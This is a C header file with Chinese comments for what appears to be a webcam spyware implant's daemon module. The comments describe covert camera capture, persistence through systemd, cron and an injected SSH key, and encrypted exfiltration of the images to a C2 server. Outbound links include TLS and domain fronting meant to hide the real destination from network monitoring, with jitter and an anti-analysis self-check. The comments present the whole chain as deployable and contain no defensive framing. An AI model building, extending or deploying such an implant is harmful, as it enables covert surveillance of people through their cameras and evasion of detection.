/*
 * agent_windows/include/cam_daemon.h
 *
 * 摄像头常驻守护：把「采集 — 驻留 — 回传」三段真正串成一条可部署链路。
 *
 * ====================================================================
 * 与既有模块的分工（本文件不重复实现任何一层）
 * ====================================================================
 *   采集   —— camera.h（后端可替换：mock / v4l2 / mf）
 *   编排   —— implant.h（采集 -> 打包 -> 回传 状态机 + 抖动退避）
 *   驻留   —— persist.h（persist_linux_ensure：落盘 + systemd/cron/sshkey）
 *   回传   —— exfil.h + exfil_link.h（AEAD 定长信元 + fd 传输）
 *
 * 本文件只做三件别人不做的事：
 *   1. 把 implant 的 pack/exfil 回调接到**真实** 21_exfil 通道上
 *      （此前 implant 的回传是测试里的假回调，链路从未真实闭合）
 *   2. 在运行前确保驻留（幂等，支持 root_prefix 假根以便测试）
 *   3. 守护进程化 + 信号停止 + pid 文件
 *
 * ====================================================================
 * 为什么 pack 不能是 identity（关键，改动前必读）
 * ====================================================================
 * implant.h 的硬规则：未注入 pack 回调时绝不回传明文。因此 pack 必须
 * 承担「明文 -> 密文」这唯一一次转换。本实现让 pack 直接产出 21_exfil
 * 的 AEAD 信元（线上恒 512 字节/信元），exfil 回调只负责把信元写进
 * sink fd。
 *
 * 若把 pack 写成 memcpy（identity）而把加密挪到 exfil 里，则一旦有人
 * 漏配 exfil 回调、或 exfil 失败重试，明文 JPEG 就会以某种形式落盘 /
 * 落链路。把加密固定在 pack 里，使「无 pack 即无数据」成为结构性保证。
 *
 * ====================================================================
 * sink 语义
 * ====================================================================
 *   "fd://N"   使用已打开的 fd N（由父进程/服务管理器传入，本进程不 close）
 *   "tcp://host:port"   明文 TCP，本进程建连、断线进程内重连
 *   "tls://host:port"   同上，但在 TCP 之上叠加自研 TLS 1.2 记录层
 *   "front://前置域:port"  域前置：TLS 的 SNI 指向前置域，真实目标放在
 *                         内层 HTTP 的 Host 里（见 front.h）。必须同时给
 *                         front_host，否则拒绝启动。
 *   "/path"    以 O_WRONLY|O_CREAT|O_APPEND 打开，本进程负责 close
 *   NULL       不回传。仅用于测试采集与驻留两段，不得用于部署。
 *
 * ====================================================================
 * 为什么 front:// 的 SNI 与 Host 绝不能从同一个字符串推导（改动前必读）
 * ====================================================================
 * 域前置的全部价值在于"链路上只能看见前置域"。若 real_host 从 sink 的
 * host 段推导，两者恒等，于是：
 *   —— 功能完全正常（请求照发、响应照收、所有连通性测试全绿）；
 *   —— 前置能力为零（真实目标直接以明文 SNI 暴露在链路上）；
 *   —— 没有任何一处会报错。
 * 这是本项目反复出现的"用了但没生效"形态中最坏的一种：坏在链路暴露，
 * 而不是坏在功能。故 front_host 是独立必填参数，且与前置域相同即拒绝。
 *
 * ====================================================================
 * 为什么 tcp:// 仍要保留（即便有了 tls://）
 * ====================================================================
 * 信元本身已经是 AEAD 密文，TLS 层提供的是另外三件 AEAD 给不了的东西：
 *   1) 服务端身份认证 —— 否则 camd 无法确认连上的是自家 C2 还是劫持者；
 *   2) 记录层长度与形态的统一 —— 裸 TCP 上"512 字节固定节拍"本身就是
 *      可被流量分析识别的特征；
 *   3) 干净的连接终止语义（close_notify），见 tls.h 的说明。
 * 但明文 tcp:// 不能删：内网回环自测、以及与不支持 TLS 的既有收端联调
 * 都要用它。删掉会让这两条路径失去覆盖，而不是提高安全性。
 */

#ifndef DAYANJING_AGENT_WINDOWS_CAM_DAEMON_H
#define DAYANJING_AGENT_WINDOWS_CAM_DAEMON_H

#include "implant.h"

#include <stddef.h>
#include <stdint.h>

#ifdef __cplusplus
extern "C" {
#endif

#define CAM_DAEMON_PERSIST_N  3   /* {SYSTEMD, CRON, SSHKEY} */

typedef struct {
    const char *backend;      /* NULL = 按平台自动选择 */
    const char *root_prefix;  /* 驻留假根；NULL = 真实根（部署默认） */
    const char *sink_path;    /* 信元落点，见上；NULL = 不回传 */
    const char *pid_path;     /* NULL = 不写 pid 文件 */

    /* TLS 出口（仅当 sink_path 是 tls:// 时生效）
     *
     * tls_ca    : 信任库 PEM。NULL 表示不校验证书。
     * tls_sni   : 写入 SNI 的主机名，同时用作证书主机名校验的默认值。
     *             NULL 时从 tls:// 的 host 段推导（IP 字面量除外）。
     *
     * 为什么 tls_verify 默认必须为 1：
     *   不校验 = 任何人都能用自签证书冒充 C2。此时 TLS 只提供"流量看着像
     *   TLS"，而信元虽是 AEAD 密文，密钥却是部署时固定的——冒充者虽解不
     *   开内容，却能让植入体把画面持续发给自己，形成可控的"黑洞"，并借
     *   此测绘出哪些主机在线。因此校验是默认项，关闭需显式传 --no-verify。 */
    const char *tls_ca;
    const char *tls_sni;
    int         tls_verify;   /* 1 = 校验证书链与主机名（默认） */

    /* 域前置（仅当 sink_path 是 front:// 时生效）
     *
     * front_host : 真实目标主机名，进内层 HTTP 的 Host。必填，且不得与
     *              sink 的 host 段（前置域）相同——相同即前置形同虚设。
     * front_path : 前置域允许的 URL 前缀，如 "/api/v1/"。NULL 用层内默认。
     *
     * 不同于 tls_sni 可以有缺省推导，front_host **没有** 缺省值：可推导
     * 就意味着与前置域同源，而那正是要防的失效。 */
    const char *front_host;   /* 必填（front:// 时） */
    const char *front_path;   /* 可选 */

    /* 采集参数 */
    uint32_t width, height, fps;
    uint32_t capture_ms;      /* 单次采集窗口，到点释放设备句柄 */
    uint32_t frames_per_batch;
    uint32_t jpeg_quality;    /* 1..100 */

    /* 节拍 */
    uint32_t interval_ms;
    uint32_t jitter_ms;       /* 抖动上限；固定间隔会在断线重连时形成同步爆发 */
    uint32_t max_batches;     /* 0 = 不限，由 stop 终止 */

    /* 回传密钥（方向分离，两端相反）；NULL 时使用内置测试密钥 */
    const uint8_t *k_send;
    const uint8_t *k_recv;
    const uint8_t *pfx;       /* 8 字节 nonce 前缀 */

    int daemonize;            /* 非 0 = 双 fork + setsid 后台化 */
    int ensure_persist;       /* 非 0 = 运行前确保驻留 */
    int run_defend;           /* 非 0 = 执行对抗自检（Windows 侧实现） */

    /* sshkey 驻留所需的真实公钥行文件（整行，含类型前缀与 blob）。
     *
     * 为什么必须是"文件"而不是直接传公钥字符串：
     *   公钥行含空格（"ssh-ed25519 AAAA... user@host"），在 conf 里要引号
     *   包起来，而此前 CAMD_EXTRA 因缺引号被 shell 解析成"临时环境变量 +
     *   执行命令"，现象是 camd 报"缺参数"而 conf 里明明写着——排查方向会
     *   被彻底带偏。传路径则天然无空格问题。
     *
     * 为什么"未提供"与"提供了但非法"必须区别对待（改动前必读）：
     *   persist_sshkey_pubkey 未注入时，sshkey 生成返回 0（拒绝），绝不写
     *   无法认证的占位 key。若对"提供了非法公钥"静默降级，则部署侧看到
     *   persist_linux_ensure 返回成功（部分成功分支成立），sshkey 段却是
     *   死的——配了、没生效、没有任何一处报错。故非法公钥必须 FATAL。
     *
     * NULL = 不启用 sshkey 驻留（合法形态，此时 methods[SSHKEY]=0）。 */
    const char *ssh_pubkey_file;
} cam_daemon_cfg_t;

typedef struct {
    uint32_t batches;
    uint32_t frames;
    uint64_t bytes_out;       /* 实际写出信元字节数 */
    int      persist_rc;      /* persist_linux_ensure: 0=新装 1=已驻留 -1=失败 */
    int      methods[CAM_DAEMON_PERSIST_N];
    char     bin_path[4096];
    implant_err_t last_err;
} cam_daemon_stats_t;

/*
 * 运行守护主循环。阻塞直到跑完 max_batches、出错停止或被信号停止。
 * 成功返回 0；参数非法 -1；驻留失败 -2；采集源创建失败 -3；回传通道初始化失败 -4。
 *
 * -5/-6 见实现处：-5 = 回传写出阶段失败；-6 = sshkey 公钥注入失败
 * （文件读不到或内容非法）。-6 刻意不与 -3 复用：-3 是"采集源创建失败"，
 * 若把公钥非法也报成 -3，部署方会按"摄像头设备有问题"去排查，而真相是
 * 一行公钥写错了——两者毫无关系，混用等于把排查方向彻底带偏。
 * out_stats 可为 NULL。
 *
 * 注意：daemonize 会在本函数**内部**发生（驻留完成之后），因此调用方
 * 在 daemonize=1 时拿不到返回值 —— 部署方应依赖 pid 文件与 sink 落点
 * 判断存活，而不是依赖进程返回值。这是双 fork 的固有语义，不是缺陷。
 */
int cam_daemon_run(const cam_daemon_cfg_t *cfg, cam_daemon_stats_t *out_stats);

/* 请求停止。由信号处理器调用；异步信号安全。 */
void cam_daemon_request_stop(void);

#ifdef __cplusplus
}
#endif

#endif /* DAYANJING_AGENT_WINDOWS_CAM_DAEMON_H */
